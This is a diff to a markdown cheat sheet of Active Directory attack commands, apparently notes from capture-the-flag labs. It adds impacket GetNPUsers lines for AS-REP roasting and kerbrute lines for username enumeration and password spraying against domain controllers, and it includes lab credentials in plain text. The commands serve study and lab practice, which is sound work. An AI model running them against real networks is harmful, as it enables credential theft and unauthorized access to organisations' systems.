@@ -29,6 +29,9 @@ List all groups
 ```bash
 crackmapexec smb 192.168.1.10 -u admin -p password123 --groups > groups
 ```
+
+---
+
 ### `impacket`
 
 ### **Authentication & Password Dumping**
@@ -49,18 +52,52 @@ This tool queries a remote machine for information about SIDs. It can enumerate 
 impacket-lookupsid anonymous@10.10.12.26 -no-pass -domain-sids
 ```
 
-`GetNPUsers` : When you use the **`GetNPUsers.py`** tool from Impacket to dump users with the **"Do not require Kerberos preauthentication"** option enabled, the output typically provides the following:
-1. **Usernames**: A list of usernames that have the preauthentication requirement disabled.
-2. **Kerberos AS-REQ Hashes**: If the user has preauthentication disabled, the tool retrieves the Kerberos AS-REQ hash (Ticket Granting Ticket Request). This hash can be cracked offline to retrieve the user's plaintext password using tools like **hashcat**.
+`GetNPUsers` : `ASREP` Roasting.
 
+When you use the **`GetNPUsers.py`** tool from `Impacket` to dump users with the **"Do not require `Kerberos preauthentication`** option enabled, the output typically provides the following:
+1. **Usernames**: A list of usernames that have the `preauthentication` requirement disabled.
+2. **`Kerberos AS-REQ` Hashes**: If the user has `preauthentication` disabled, the tool retrieves the `Kerberos AS-REQ` hash (Ticket Granting Ticket Request). This hash can be cracked offline to retrieve the user's `plaintext` password using tools like **`hashcat`**.
+
+get a specific format of specific `IP` of specific domain
 ```bash
 impacket-GetNPUsers -request -format john  lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.10.141.253 -output hash
-
 ```
 
+just the domain
+```bash
+impacket-GetNPUsers thm.corp/TABATHA_BRITT
+```
 
+from users list
+```bash
+impacket-GetNPUsers the.corp/ -dc-ip 10.10.42.254 -usersfile users -format john -outputfile hash -no-pass -request
+```
 
+---
 
+### `kerbrute`
+
+This command attempts to enumerate valid usernames from a provided list.
+
+userenum
+```bash
+kerbrute userenum -d the.corp -dc 10.10.42.254 users
+```
+
+`passwordspray`
+
+```bash
+kerbrute passwordspray -d the.corp -dc 10.10.42.254 -U admin passwords
+```
+- -d the.corp : Specifies the domain name. 
+- -dc 10.10.42.254 : The IP address of the Domain Controller. 
+- -U admin : The username to brute-force. passwords.txt : The file containing the list of passwords to try
+
+```bash
+kerbrute passwordspray -d the.corp -dc 10.10.42.254 -P "Password123" users
+```
+
+---
 
 ### bloodhound
 #### Neo4j
